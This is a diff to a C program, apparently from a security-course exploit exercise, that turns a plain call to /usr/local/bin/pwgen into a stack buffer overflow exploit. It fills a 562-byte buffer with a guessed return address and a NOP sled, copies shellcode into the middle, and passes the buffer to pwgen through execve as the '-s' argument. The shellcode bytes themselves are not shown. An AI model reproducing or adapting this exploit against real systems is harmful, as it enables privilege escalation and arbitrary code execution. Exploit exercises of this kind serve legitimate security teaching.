@@ -9,17 +9,42 @@
 
 #define TARGET "/usr/local/bin/pwgen"
 
-int main(void)
-{
+#define BUFFER_SIZE 562
+#define NOP 0x90
+
+int main(void) {
   char *args[4];
   char *env[1];
 
   // one way to invoke pwgen, system() creates a separate process
-  system("/usr/local/bin/pwgen -v");
+  // system("/usr/local/bin/pwgen -v");
+
+  char *buff, *ptr;
+  long *addr_ptr;
+  int i;
+
+  if (!(buff = malloc(BUFFER_SIZE))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for(i = 0; i < BUFFER_SIZE; i+=4)
+    *(addr_ptr++) = 0xbfd7dfff;
+
+  for(i = 0; i < BUFFER_SIZE/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((BUFFER_SIZE/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[BUFFER_SIZE - 1] = '\0';
 
   // another way
-  args[0] = TARGET; args[1] = "--type"; 
-  args[2] = "3"; args[3] = NULL;
+  args[0] = TARGET; args[1] = "-s";
+  args[2] = buff; args[3] = NULL;
 
   env[0] = NULL;
   // execve() executes the target program by overwriting the
